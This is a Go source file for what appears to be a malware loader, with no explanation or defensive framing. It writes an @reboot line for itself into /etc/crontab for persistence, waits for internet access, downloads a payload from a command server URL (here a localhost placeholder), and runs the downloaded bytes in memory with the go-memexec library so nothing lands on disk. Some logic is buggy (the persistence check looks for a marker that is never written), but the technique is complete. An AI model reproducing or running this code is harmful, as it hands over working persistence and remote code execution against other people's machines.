package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/amenzhinsky/go-memexec"
)

const (
	HOME = "http://127.0.0.1:5000/update"
)

var (
	PAYLOAD []byte
)

func main() {
	fmt.Println("Hello friend")
	if !has_persisted() {
		persist()
	}
	for !has_internet_access() {
		time.Sleep(time.Minute)
	}
	fetch_payload()
	fmt.Println("Deploying :|")
	go deploy(PAYLOAD)
}

func has_persisted() bool {
	flag := "alpha"
	file, _ := os.Open("/etc/crontab")
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, flag) {
			return true
		}
	}
	return false
}

func persist() {
	path, _ := os.Executable()
	new_job := fmt.Sprintf("@reboot %s", path)
	crontab, _ := os.OpenFile("/etc/crontab", os.O_APPEND|os.O_WRONLY, 0644)
	scanner := bufio.NewScanner(crontab)
	var content string
	for scanner.Scan() {
		content = scanner.Text() + "\n"
	}
	content += new_job + "\n"
	crontab.Write([]byte(content))
}

func has_internet_access() bool {
	_, err := http.Get("https://www.google.com")
	return err == nil
}

func fetch_payload() {
	client := &http.Client{}
	request, _ := http.NewRequest(http.MethodGet, HOME, nil)
	resp, _ := client.Do(request)
	body := resp.Body
	bytes, _ := io.ReadAll(body)
	PAYLOAD = bytes
}

func deploy(payload []byte) {
	exe, _ := memexec.New(PAYLOAD)
	exe.Command().Output()
}
